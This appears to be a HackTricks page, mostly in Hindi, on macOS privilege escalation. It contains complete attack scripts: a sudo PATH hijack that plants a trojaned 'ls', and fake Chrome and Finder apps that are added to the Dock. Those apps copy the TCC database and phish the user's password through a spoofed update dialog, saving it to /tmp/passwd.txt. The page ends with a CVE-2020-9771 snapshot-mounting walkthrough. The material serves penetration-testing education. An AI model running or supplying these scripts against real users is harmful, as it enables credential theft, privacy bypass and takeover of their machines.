# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

यदि आप TCC विशेषाधिकार वृद्धि के लिए यहाँ आए हैं तो जाएँ:

{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

कृपया ध्यान दें कि **विशेषाधिकार वृद्धि के बारे में अधिकांश तरकीबें जो Linux/Unix को प्रभावित करती हैं, वे MacOS** मशीनों को भी प्रभावित करेंगी। तो देखें:

{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## User Interaction

### Sudo Hijacking

आप मूल [Sudo Hijacking तकनीक को Linux Privilege Escalation पोस्ट के अंदर पा सकते हैं](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

हालांकि, macOS **उपयोगकर्ता का** **`PATH`** बनाए रखता है जब वह **`sudo`** निष्पादित करता है। जिसका अर्थ है कि इस हमले को प्राप्त करने का एक और तरीका होगा **अन्य बाइनरीज़ को हाईजैक करना** जिन्हें पीड़ित **sudo चलाते समय** निष्पादित करेगा:
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
ध्यान दें कि एक उपयोगकर्ता जो टर्मिनल का उपयोग करता है, उसके पास **Homebrew स्थापित** होने की संभावना है। इसलिए **`/opt/homebrew/bin`** में बाइनरीज़ को हाईजैक करना संभव है।

### डॉक अनुकरण

कुछ **सोशल इंजीनियरिंग** का उपयोग करके आप डॉक के अंदर **उदाहरण के लिए Google Chrome** का **अनुकरण** कर सकते हैं और वास्तव में अपना खुद का स्क्रिप्ट चला सकते हैं:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
कुछ सुझाव:

- डॉक में जांचें कि क्या वहां एक Chrome है, और इस मामले में उस प्रविष्टि को **हटाएं** और डॉक एरे में **समान स्थिति** में **नकली** **Chrome प्रविष्टि जोड़ें**।
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
कुछ सुझाव:

- आप **Finder को Dock से हटा नहीं सकते**, इसलिए यदि आप इसे Dock में जोड़ने जा रहे हैं, तो आप असली Finder के ठीक बगल में नकली Finder रख सकते हैं। इसके लिए आपको **Dock array के शुरुआत में नकली Finder प्रविष्टि जोड़ने की आवश्यकता है**।
- एक और विकल्प है कि इसे Dock में न रखें और बस इसे खोलें, "Finder को Finder को नियंत्रित करने के लिए पूछना" इतना अजीब नहीं है।
- एक और विकल्प **बिना पासवर्ड पूछे root तक पहुंच बढ़ाने** का है, वह है Finder से वास्तव में पासवर्ड मांगना ताकि एक विशेषाधिकार प्राप्त क्रिया करने के लिए:
- Finder से **`/etc/pam.d`** में एक नया **`sudo`** फ़ाइल कॉपी करने के लिए कहें (पासवर्ड के लिए पूछने वाला प्रॉम्प्ट यह संकेत देगा कि "Finder sudo को कॉपी करना चाहता है")
- Finder से एक नया **Authorization Plugin** कॉपी करने के लिए कहें (आप फ़ाइल का नाम नियंत्रित कर सकते हैं ताकि पासवर्ड के लिए पूछने वाला प्रॉम्प्ट यह संकेत दे कि "Finder Finder.bundle को कॉपी करना चाहता है")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

## TCC - रूट विशेषाधिकार वृद्धि

### CVE-2020-9771 - mount_apfs TCC बाईपास और विशेषाधिकार वृद्धि

**कोई भी उपयोगकर्ता** (यहां तक कि बिना विशेषाधिकार वाले) एक टाइम मशीन स्नैपशॉट बना और माउंट कर सकता है और उस स्नैपशॉट के **सभी फ़ाइलों** तक पहुंच सकता है।\
आवश्यक **केवल विशेषाधिकार** यह है कि उपयोग किए जाने वाले एप्लिकेशन (जैसे `Terminal`) को **पूर्ण डिस्क एक्सेस** (FDA) एक्सेस (`kTCCServiceSystemPolicyAllfiles`) होना चाहिए, जिसे एक व्यवस्थापक द्वारा प्रदान किया जाना चाहिए।
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
एक अधिक विस्तृत व्याख्या [**मूल रिपोर्ट में**](https://theevilbit.github.io/posts/cve_2020_9771/) **मिल सकती है।**

## संवेदनशील जानकारी

यह विशेषाधिकार बढ़ाने के लिए उपयोगी हो सकता है:

{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
